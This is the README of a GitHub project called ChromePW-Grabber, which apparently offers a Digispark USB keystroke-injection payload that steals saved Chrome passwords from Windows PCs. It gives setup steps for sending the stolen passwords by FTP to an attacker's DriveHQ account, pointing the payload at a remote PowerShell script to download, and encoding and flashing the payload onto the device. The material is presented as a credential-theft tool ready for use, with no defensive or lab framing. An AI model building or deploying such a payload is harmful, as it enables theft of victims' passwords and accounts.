
# ChromePW-Grabber

This is a simple script which can extract browser passwords from Windows Computer using Digispark


## Authors

- [@otaviozanon](https://www.github.com/otaviozanon)


## What you need

- DigiSpark Attiny85 USB Board
- Arduino IDE
- Windows/Linux Host PC
- Windows PC for Testing
- Drivehq.com Free Account
- Python
- Java


## How to setup
 (ChromePW-Grabber.ps1)
- Place your DriveHQ Username here $ftpUser = "username" 
- Place your DriveHQ Password here $ftpPassword = "password"
- Place your DriveHQ Destination here $ftpDestination = "\My Documents\Hacking\log.txt"

(ChromePW-Grabber.duck)
- Place your repository url .ps1 from cloud

(Copy .duck Inside root folder project and run inside powershell)
```bash
  cd (your project folder)
```
```bash
  java -jar encoder/encoder.jar -i ChromePWGrabberPayload.duck -o ChromePWGrabberPayload.bin -l .\encoder\resources\(keyboard setup) eg: us.properties
```

```bash
  python duck2spark/duck2spark.py -i ChromePWGrabberPayload.bin -l 1 -f 2000 -o ChromePWGrabberPayload.ino
```

After run ChromePWGrabberPayload.ino inside Arduino IDE and put your Digispark.


## Indicators

LED ON indicates that program is now Executing BLINKING LED indicates that progam has Ended


